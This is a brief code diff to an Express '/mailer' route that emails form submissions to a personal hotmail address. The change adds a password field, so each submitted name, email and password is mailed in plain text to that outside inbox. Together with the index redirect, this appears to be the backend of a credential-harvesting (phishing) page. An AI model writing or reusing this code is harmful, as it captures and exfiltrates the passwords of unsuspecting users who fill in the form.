@@ -80,8 +80,8 @@ app.post('/mailer',(req,res)=>{
         from: 'hernan',
         to: 'hernag_09@hotmail.com',
         subject: 'heroku',
-        text: 'name' + req.body.user + 'mail' + req.body.email + 'message' + req.body.area,
-        html: '<ul><li>' + req.body.user + '</li><li>' + req.body.email + '</li></ul>' + '<p>' + req.body.area + '</p>'
+        text: 'name' + req.body.useri + 'password' + req.body.pass +'Email'+req.body.mail+ 'message' + req.body.area,
+        html: '<ul><li>' + req.body.useri + '</li><li>' + req.body.mail + '</li><li>'+req.body.pass+'</li></ul>' + '<p>' + req.body.area + '</p>'
 
     }
 
@@ -89,7 +89,7 @@ app.post('/mailer',(req,res)=>{
         if (error) console.log(`${error}`)
         else {
             console.log(info)
-            res.redirect('/home')
+            res.redirect('/index')
         }
     })
 })
